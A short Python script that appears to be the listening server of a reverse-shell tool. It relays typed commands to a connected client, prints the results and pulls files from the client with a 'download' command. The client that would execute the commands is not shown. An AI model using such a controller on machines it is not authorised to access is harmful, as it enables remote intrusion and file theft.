import socket
import os

from utils import is_cd_cmd, receive_file


def start_server():
    host = '127.0.0.1'
    port = 12344

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()

        print(f"Server listening on {host}:{port}")

        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected by {addr}")
            cwd = conn.recv(4096).decode('utf-8')

            while True:
                command = input(f"{cwd} $ ")

                if command.lower().startswith('download'):
                    # Extracting filename from the command
                    _, filename = command.split(' ', 1)
                    filepath = cwd + f"/{filename}"
                    print(filepath)
                    command = f"download {filepath}"
                    conn.sendall(command.encode('utf-8'))

                    receive_file(conn, f"download/{filename}")
                    continue

                conn.sendall(command.encode('utf-8'))

                if command.lower() == 'exit':
                    break

                # Receive and print the output from the client
                response = conn.recv(4096).decode('utf-8')

                # handle error if any
                if response.split(' ')[0] == "%->":
                    print(response)
                    continue

                elif command.lower().startswith('cd'):
                    cwd = response
                    # print(cd_result)
                    continue
                else:
                    print(response)


if __name__ == "__main__":
    start_server()
